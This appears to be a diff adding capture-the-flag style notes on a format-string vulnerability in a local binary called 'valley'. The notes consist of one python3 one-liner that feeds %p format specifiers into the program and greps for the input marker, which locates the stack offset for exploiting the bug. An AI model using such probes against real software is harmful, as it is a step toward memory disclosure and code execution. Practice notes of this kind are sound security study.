@@ -1,1 +1,3 @@
-a
+Format String vulnerability...
+
+python3 -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,40)]))" | ./valley | grep 4847
